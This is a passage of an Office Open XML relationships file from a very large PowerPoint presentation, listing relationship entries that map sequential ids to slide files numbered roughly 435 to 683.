Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide434.xml"/><Relationship Id="rId441" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide435.xml"/><Relationship Id="rId442" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide436.xml"/><Relationship Id="rId443" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide437.xml"/><Relationship Id="rId444" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide438.xml"/><Relationship Id="rId445" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide439.xml"/><Relationship Id="rId446" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide440.xml"/><Relationship Id="rId447" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide441.xml"/><Relationship Id="rId448" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide442.xml"/><Relationship Id="rId449" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide443.xml"/><Relationship Id="rId450" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide444.xml"/><Relationship Id="rId451" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide445.xml"/><Relationship Id="rId452" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide446.xml"/><Relationship Id="rId453" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide447.xml"/><Relationship Id="rId454" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide448.xml"/><Relationship Id="rId455" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide449.xml"/><Relationship Id="rId456" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide450.xml"/><Relationship Id="rId457" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide451.xml"/><Relationship Id="rId458" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide452.xml"/><Relationship Id="rId459" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide453.xml"/><Relationship Id="rId460" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide454.xml"/><Relationship Id="rId461" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide455.xml"/><Relationship Id="rId462" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide456.xml"/><Relationship Id="rId463" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide457.xml"/><Relationship Id="rId464" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide458.xml"/><Relationship Id="rId465" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide459.xml"/><Relationship Id="rId466" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide460.xml"/><Relationship Id="rId467" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide461.xml"/><Relationship Id="rId468" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide462.xml"/><Relationship Id="rId469" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide463.xml"/><Relationship Id="rId470" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide464.xml"/><Relationship Id="rId471" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide465.xml"/><Relationship Id="rId472" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide466.xml"/><Relationship Id="rId473" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide467.xml"/><Relationship Id="rId474" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide468.xml"/><Relationship Id="rId475" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide469.xml"/><Relationship Id="rId476" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide470.xml"/><Relationship Id="rId477" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide471.xml"/><Relationship Id="rId478" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide472.xml"/><Relationship Id="rId479" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide473.xml"/><Relationship Id="rId480" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide474.xml"/><Relationship Id="rId481" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide475.xml"/><Relationship Id="rId482" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide476.xml"/><Relationship Id="rId483" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide477.xml"/><Relationship Id="rId484" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide478.xml"/><Relationship Id="rId485" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide479.xml"/><Relationship Id="rId486" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide480.xml"/><Relationship Id="rId487" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide481.xml"/><Relationship Id="rId488" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide482.xml"/><Relationship Id="rId489" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide483.xml"/><Relationship Id="rId490" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide484.xml"/><Relationship Id="rId491" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide485.xml"/><Relationship Id="rId492" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide486.xml"/><Relationship Id="rId493" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide487.xml"/><Relationship Id="rId494" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide488.xml"/><Relationship Id="rId495" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide489.xml"/><Relationship Id="rId496" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide490.xml"/><Relationship Id="rId497" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide491.xml"/><Relationship Id="rId498" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide492.xml"/><Relationship Id="rId499" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide493.xml"/><Relationship Id="rId500" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide494.xml"/><Relationship Id="rId501" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide495.xml"/><Relationship Id="rId502" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide496.xml"/><Relationship Id="rId503" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide497.xml"/><Relationship Id="rId504" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide498.xml"/><Relationship Id="rId505" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide499.xml"/><Relationship Id="rId506" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide500.xml"/><Relationship Id="rId507" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide501.xml"/><Relationship Id="rId508" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide502.xml"/><Relationship Id="rId509" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide503.xml"/><Relationship Id="rId510" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide504.xml"/><Relationship Id="rId511" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide505.xml"/><Relationship Id="rId512" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide506.xml"/><Relationship Id="rId513" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide507.xml"/><Relationship Id="rId514" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide508.xml"/><Relationship Id="rId515" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide509.xml"/><Relationship Id="rId516" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide510.xml"/><Relationship Id="rId517" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide511.xml"/><Relationship Id="rId518" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide512.xml"/><Relationship Id="rId519" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide513.xml"/><Relationship Id="rId520" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide514.xml"/><Relationship Id="rId521" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide515.xml"/><Relationship Id="rId522" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide516.xml"/><Relationship Id="rId523" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide517.xml"/><Relationship Id="rId524" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide518.xml"/><Relationship Id="rId525" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide519.xml"/><Relationship Id="rId526" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide520.xml"/><Relationship Id="rId527" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide521.xml"/><Relationship Id="rId528" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide522.xml"/><Relationship Id="rId529" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide523.xml"/><Relationship Id="rId530" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide524.xml"/><Relationship Id="rId531" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide525.xml"/><Relationship Id="rId532" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide526.xml"/><Relationship Id="rId533" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide527.xml"/><Relationship Id="rId534" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide528.xml"/><Relationship Id="rId535" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide529.xml"/><Relationship Id="rId536" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide530.xml"/><Relationship Id="rId537" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide531.xml"/><Relationship Id="rId538" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide532.xml"/><Relationship Id="rId539" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide533.xml"/><Relationship Id="rId540" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide534.xml"/><Relationship Id="rId541" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide535.xml"/><Relationship Id="rId542" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide536.xml"/><Relationship Id="rId543" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide537.xml"/><Relationship Id="rId544" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide538.xml"/><Relationship Id="rId545" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide539.xml"/><Relationship Id="rId546" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide540.xml"/><Relationship Id="rId547" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide541.xml"/><Relationship Id="rId548" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide542.xml"/><Relationship Id="rId549" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide543.xml"/><Relationship Id="rId550" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide544.xml"/><Relationship Id="rId551" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide545.xml"/><Relationship Id="rId552" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide546.xml"/><Relationship Id="rId553" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide547.xml"/><Relationship Id="rId554" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide548.xml"/><Relationship Id="rId555" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide549.xml"/><Relationship Id="rId556" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide550.xml"/><Relationship Id="rId557" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide551.xml"/><Relationship Id="rId558" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide552.xml"/><Relationship Id="rId559" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide553.xml"/><Relationship Id="rId560" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide554.xml"/><Relationship Id="rId561" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide555.xml"/><Relationship Id="rId562" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide556.xml"/><Relationship Id="rId563" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide557.xml"/><Relationship Id="rId564" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide558.xml"/><Relationship Id="rId565" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide559.xml"/><Relationship Id="rId566" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide560.xml"/><Relationship Id="rId567" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide561.xml"/><Relationship Id="rId568" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide562.xml"/><Relationship Id="rId569" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide563.xml"/><Relationship Id="rId570" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide564.xml"/><Relationship Id="rId571" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide565.xml"/><Relationship Id="rId572" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide566.xml"/><Relationship Id="rId573" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide567.xml"/><Relationship Id="rId574" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide568.xml"/><Relationship Id="rId575" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide569.xml"/><Relationship Id="rId576" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide570.xml"/><Relationship Id="rId577" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide571.xml"/><Relationship Id="rId578" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide572.xml"/><Relationship Id="rId579" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide573.xml"/><Relationship Id="rId580" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide574.xml"/><Relationship Id="rId581" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide575.xml"/><Relationship Id="rId582" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide576.xml"/><Relationship Id="rId583" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide577.xml"/><Relationship Id="rId584" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide578.xml"/><Relationship Id="rId585" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide579.xml"/><Relationship Id="rId586" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide580.xml"/><Relationship Id="rId587" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide581.xml"/><Relationship Id="rId588" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide582.xml"/><Relationship Id="rId589" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide583.xml"/><Relationship Id="rId590" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide584.xml"/><Relationship Id="rId591" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide585.xml"/><Relationship Id="rId592" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide586.xml"/><Relationship Id="rId593" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide587.xml"/><Relationship Id="rId594" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide588.xml"/><Relationship Id="rId595" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide589.xml"/><Relationship Id="rId596" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide590.xml"/><Relationship Id="rId597" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide591.xml"/><Relationship Id="rId598" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide592.xml"/><Relationship Id="rId599" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide593.xml"/><Relationship Id="rId600" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide594.xml"/><Relationship Id="rId601" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide595.xml"/><Relationship Id="rId602" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide596.xml"/><Relationship Id="rId603" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide597.xml"/><Relationship Id="rId604" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide598.xml"/><Relationship Id="rId605" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide599.xml"/><Relationship Id="rId606" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide600.xml"/><Relationship Id="rId607" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide601.xml"/><Relationship Id="rId608" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide602.xml"/><Relationship Id="rId609" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide603.xml"/><Relationship Id="rId610" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide604.xml"/><Relationship Id="rId611" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide605.xml"/><Relationship Id="rId612" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide606.xml"/><Relationship Id="rId613" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide607.xml"/><Relationship Id="rId614" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide608.xml"/><Relationship Id="rId615" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide609.xml"/><Relationship Id="rId616" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide610.xml"/><Relationship Id="rId617" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide611.xml"/><Relationship Id="rId618" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide612.xml"/><Relationship Id="rId619" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide613.xml"/><Relationship Id="rId620" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide614.xml"/><Relationship Id="rId621" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide615.xml"/><Relationship Id="rId622" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide616.xml"/><Relationship Id="rId623" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide617.xml"/><Relationship Id="rId624" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide618.xml"/><Relationship Id="rId625" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide619.xml"/><Relationship Id="rId626" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide620.xml"/><Relationship Id="rId627" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide621.xml"/><Relationship Id="rId628" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide622.xml"/><Relationship Id="rId629" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide623.xml"/><Relationship Id="rId630" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide624.xml"/><Relationship Id="rId631" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide625.xml"/><Relationship Id="rId632" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide626.xml"/><Relationship Id="rId633" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide627.xml"/><Relationship Id="rId634" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide628.xml"/><Relationship Id="rId635" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide629.xml"/><Relationship Id="rId636" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide630.xml"/><Relationship Id="rId637" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide631.xml"/><Relationship Id="rId638" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide632.xml"/><Relationship Id="rId639" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide633.xml"/><Relationship Id="rId640" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide634.xml"/><Relationship Id="rId641" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide635.xml"/><Relationship Id="rId642" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide636.xml"/><Relationship Id="rId643" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide637.xml"/><Relationship Id="rId644" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide638.xml"/><Relationship Id="rId645" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide639.xml"/><Relationship Id="rId646" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide640.xml"/><Relationship Id="rId647" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide641.xml"/><Relationship Id="rId648" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide642.xml"/><Relationship Id="rId649" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide643.xml"/><Relationship Id="rId650" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide644.xml"/><Relationship Id="rId651" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide645.xml"/><Relationship Id="rId652" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide646.xml"/><Relationship Id="rId653" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide647.xml"/><Relationship Id="rId654" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide648.xml"/><Relationship Id="rId655" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide649.xml"/><Relationship Id="rId656" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide650.xml"/><Relationship Id="rId657" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide651.xml"/><Relationship Id="rId658" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide652.xml"/><Relationship Id="rId659" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide653.xml"/><Relationship Id="rId660" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide654.xml"/><Relationship Id="rId661" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide655.xml"/><Relationship Id="rId662" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide656.xml"/><Relationship Id="rId663" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide657.xml"/><Relationship Id="rId664" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide658.xml"/><Relationship Id="rId665" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide659.xml"/><Relationship Id="rId666" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide660.xml"/><Relationship Id="rId667" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide661.xml"/><Relationship Id="rId668" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide662.xml"/><Relationship Id="rId669" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide663.xml"/><Relationship Id="rId670" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide664.xml"/><Relationship Id="rId671" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide665.xml"/><Relationship Id="rId672" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide666.xml"/><Relationship Id="rId673" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide667.xml"/><Relationship Id="rId674" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide668.xml"/><Relationship Id="rId675" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide669.xml"/><Relationship Id="rId676" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide670.xml"/><Relationship Id="rId677" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide671.xml"/><Relationship Id="rId678" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide672.xml"/><Relationship Id="rId679" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide673.xml"/><Relationship Id="rId680" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide674.xml"/><Relationship Id="rId681" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide675.xml"/><Relationship Id="rId682" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide676.xml"/><Relationship Id="rId683" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide677.xml"/><Relationship Id="rId684" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide678.xml"/><Relationship Id="rId685" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide679.xml"/><Relationship Id="rId686" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide680.xml"/><Relationship Id="rId687" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide681.xml"/><Relationship Id="rId688" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide682.xml"/><Relationship Id="rId689" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide683.xml"/><Relationship 